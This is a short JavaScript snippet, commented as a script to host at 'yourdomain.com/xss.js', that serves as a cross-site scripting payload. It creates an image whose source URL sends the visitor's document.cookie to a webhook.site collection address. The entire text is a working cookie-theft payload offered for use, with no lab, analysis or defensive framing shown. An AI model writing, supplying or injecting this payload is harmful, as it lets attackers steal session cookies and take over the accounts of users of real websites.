// The script to be hosted at yourdomain.com/xss.js
var img = new Image();
img.src = "https://webhook.site/a9086bcf-1e0a-4109-830f-0fd0d4a53ab9?cookie=" + encodeURIComponent(document.cookie);
